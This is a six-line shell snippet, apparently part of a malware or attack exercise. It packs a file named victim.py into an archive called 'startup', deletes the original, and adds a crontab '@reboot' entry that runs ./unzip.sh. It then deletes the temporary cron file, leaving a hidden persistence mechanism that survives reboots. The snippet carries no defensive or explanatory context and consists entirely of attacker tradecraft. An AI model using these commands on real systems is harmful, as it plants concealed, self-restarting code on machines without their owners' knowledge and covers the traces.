tar -czvf startup ./victim.py
rm victim.py
crontab -l > cron.txt
echo "@reboot ./unzip.sh" >> cron.txt
crontab cron.txt
rm cron.txt